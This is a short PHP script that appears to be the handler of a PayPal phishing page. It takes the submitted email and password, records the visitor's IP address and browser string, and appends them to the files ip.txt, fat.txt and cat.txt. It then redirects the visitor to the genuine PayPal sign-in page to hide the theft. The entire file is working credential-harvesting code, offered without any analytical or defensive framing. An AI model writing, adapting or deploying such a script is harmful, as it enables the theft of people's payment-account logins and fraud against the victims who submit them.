<?php
$var = $_POST['login_email'];
$var2 = $_POST['login_password'];
$myFile = file_get_contents("protect.html");

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$myFile = file_get_contents("protect.html");
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');
$login = "LOGIN: ";
$pass =" PASS: ";
$bar ="  /  ";

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);

fclose($fp);
$file2 = 'fat.txt';
$fp2 = fopen($file2, 'a');

fwrite($fp2, $login);
fwrite($fp2, $var);
fwrite($fp2, $bar);
fwrite($fp2, $pass);
fwrite($fp2, $var2);

fclose($fp2);


if($myFile) {
    file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "[USER-A]: " . $browser . "[IP]:" . $ipaddress ."\n", FILE_APPEND);
    header('Location: https://www.paypal.com/signin?country.x=US&locale.x=en_US');
}
exit();
?>
